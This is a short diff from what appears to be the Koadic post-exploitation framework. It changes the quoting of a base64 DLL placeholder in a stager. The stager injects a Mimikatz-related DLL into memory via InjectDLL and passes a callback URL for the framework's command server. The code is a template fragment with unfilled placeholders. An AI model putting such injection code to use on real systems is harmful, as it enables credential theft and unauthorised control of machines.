@@ -131,7 +131,7 @@ try {
 
   var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();
 
-  var base64DLL = "~SHIMX86B64~";
+  var base64DLL = ~SHIMX86B64~
 
 	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);
 
